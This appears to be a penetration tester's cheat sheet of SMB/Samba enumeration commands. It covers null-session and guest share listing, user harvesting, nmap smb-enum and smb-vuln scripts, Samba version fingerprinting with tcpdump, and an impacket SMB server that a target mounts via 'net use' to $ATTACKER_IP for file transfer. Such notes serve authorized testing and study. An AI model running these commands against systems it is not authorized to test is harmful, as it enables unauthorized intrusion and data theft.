
Enumerate with empty / guest credentials:
---
#cme #crackmapexec #smb #shares #samba

Put IP after protocol or the CME crashes!
---

Enumerate SAMBA shares without specifying user:
#null-session 
```bash
netexec smb $TARGET_IP -u '' -p '' --shares
```

or using "guest" user

```bash
netexec smb $TARGET_IP -u 'guest' -p '' --shares
```

try again with a non-existing username

```shell
netexec smb $TARGET_IP -u 'NonExistingUser' -p '' --shares
```
Enumerate users:
```sh
netexec smb $TARGET_IP -u $USER -p $PASS --users > users.txt
cat users.txt | awk '{print $5}' | grep $TARGET_AD > users.txt
#strip users from domain
cat users.txt | awk 'BEGIN{ FS = "\\"} ; {print $2}' > users
```

Connect to IP to share backups:
---
#smb #samba #share #shares

```bash
smbclient \\\\$TARGET_IP\\backups -U ''
```

```bash
smbclient -L $TARGET_IP -U $TARGET_USER
```

null user and password:
#null-session #
```bash
smbclient -L $TARGET_IP -N
```

```bash
smbclient  \\\\$TARGET_IP\\Public -N
```

**ENUMERATE SMB shares, users…:**
---
#enum #shares #smb #samba #enum4linux

Can show potential users as well in linux as well

```bash
enum4linux $TARGET_IP
```

Show SMB Shares:
---
#smbmap #smb #shares #samba

```bash
smbmap -H $TARGET_IP -u ""
```

```bash
nbtscan $TARGET_IP -f scan-result.txt
```

**Using NMAP scripts -- not usually useful:**
---
#nmap #samba #smb #enumeration #enum 

```bash
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse $TARGET_IP
```

```bash
nmap -p 139,445 --script=smb-enum-* $TARGET_IP
```

```bash
nmap -sS --script=smb-enum-shares $TARGET_IP
```

```bash
nmap --script=smb-vuln-* $TARGET_IP
```

Get SMB Version:
---
#samba #version #smb 
On terminal 1:
```
sudo tcpdump -s0 -n -i eth0 src $TARGET_IP and port 139 -A -c 10 2>/dev/null > cap.txt
```

On terminal 2:
```bash
smbclient -L $TARGET_IP
```

Parse output:
```bash
cat cap.txt | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n'
```

```bash
cat cap.txt | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'Samba.*[0-9a-z]' | tr -d '\n'
```

Create/Spin SMB server
---
#smb-server
```bash
#access on windows with \\$LOCAL_IP\s\$FILENAME
impacket-smbserver -smb2support s .
```
or if anonymous SMB access is disabled:

```bash
impacket-smbserver -smb2support -user test -password test test `pwd`
```

```powershell
net use z: \\$ATTACKER_IP\test /user:test test
```